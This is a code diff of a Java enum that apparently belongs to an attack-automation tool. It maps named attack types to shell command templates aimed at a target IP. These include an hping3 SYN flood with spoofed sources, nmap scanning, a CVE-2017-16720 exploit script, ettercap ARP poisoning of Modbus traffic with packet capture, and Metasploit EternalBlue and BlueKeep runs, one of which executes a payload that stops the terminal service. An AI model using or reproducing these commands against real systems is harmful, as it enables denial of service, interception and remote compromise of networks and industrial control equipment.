@@ -10,15 +10,19 @@ public enum AttackType {
     JIANGXIAO(2, "", "hping3 -q -n --rand-source -S -p 80 --flood ${ip}"),
 
     // 嗅探
-    XIUTAN(3, "sniffing", "nmap -sV --version-intensity 5 ${ip}"),
+    XIUTAN(3, "sniffing", "nmap -sV ${ip}"),
 
+    //操控
     CAOKONG(4, "", "python3 CVE-2017-16720.py ${ip}"),
 
-    TANHUI(5, "destroyed", "msfconsole -q -x \"use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS 192.168.1.10; set target 8;run; exit\"\n"),
+    //瘫毁
+    TANHUI(5, "destroyed", "./auto-destory.exp ${ip} ${username} ${password}"),
 
-    QIPIAN(6, "deception", "\"sudo ettercap -T -M arp:remote //${ip}/ //192.168.1.1/"),
+    //欺骗
+    QIPIAN(6, "deception", "ettercap -T -F modbus.ef -q -M ARP:remote -w /tmp/network.pcap //192.168.1.89/502 //${modbuscan_ip}/"),
 
-    JUZHI(7, "denial-of-service-attack", "hping -c 10000 -d 120 -S -p 80 --flood --rand-source ${ip}");
+    //拒止
+    JUZHI(7, "denial-of-service-attack", "msfconsole -q -x \"use windows/smb/ms17_010_eternalblue; set RHOSTS ${ip}; set PAYLOAD windows/x64/exec;set CMD 'net stop termservice /Y';run;exit;\" ");
 
     private int type;
 
